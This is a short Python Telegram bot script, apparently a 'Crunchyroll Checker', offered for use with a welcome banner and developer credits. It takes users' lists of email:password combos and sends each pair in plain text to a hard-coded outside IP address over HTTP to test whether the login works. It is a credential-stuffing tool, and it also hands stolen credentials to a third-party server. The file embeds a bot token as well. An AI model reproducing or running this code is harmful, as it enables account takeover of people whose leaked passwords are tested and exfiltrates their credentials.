import telebot
import requests

# Initialize the bot with your token
bot_token = '8031751808:AAEPv8im83ejP1OZrjbTWhmy3TSCLBSuzvg'
bot = telebot.TeleBot(bot_token)

# Start command to explain how to use the bot
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "✨ 𝖶𝖾𝗅𝖼𝗈𝗆𝖾 𝗍𝗈 𝖢𝗋𝗎𝗇𝖼𝗁𝗒𝗋𝗈𝗅𝗅 𝖢𝗁𝖾𝖼𝗄𝖾𝗋! ✨
𝖲𝖾𝗇𝖽 𝗆𝖾 𝖺 𝖼𝗈𝗆𝖻𝗈 𝗂𝗇 𝗍𝗁𝖾 𝖿𝗈𝗋𝗆𝖺𝗍 [𝖾𝗆𝖺𝗂𝗅:𝗉𝖺𝗌𝗌]

𝖴𝗌𝖾 /𝖼𝗋𝗎𝗇𝖼𝗁𝗒 𝖥𝗈𝗋 𝖲𝗂𝗇𝗀𝗅𝖾/𝖬𝗎𝗅𝗍𝗂𝗉𝗅𝖾 𝖢𝗁𝖾𝖼𝗄𝗂𝗇𝗀.
━━━━━━━━━━━━━━━━━━
[🝀] 𝐃𝐞𝐯 : ⏤͟͞ पाटील 𝟵𝟮𝟬𝟬™
━━━━━━━━━━━━━━━━━━")

# Crunchy command to handle email:pass pairs
@bot.message_handler(commands=['crunchy'])
def handle_crunchy(message):
    # Split the message text to get the email:pass pairs
    email_pass_pairs = message.text[len('/crunchy '):].strip().splitlines()

    for pair in email_pass_pairs:
        try:
            email, password = pair.split(':')
            # Make the request
            url = f"http://31.172.87.218/c.php?e={email}&p={password}"
            response = requests.get(url)
            
            # Send the response back to the user
            bot.reply_to(message, f"Email: {email}\nPassword: {password}\nResponse: {response.text}")
        except ValueError:
            bot.reply_to(message, f"Invalid format for: {pair}. It should be email:password.")
#credits to Patil9200
# Start the bot
bot.polling()
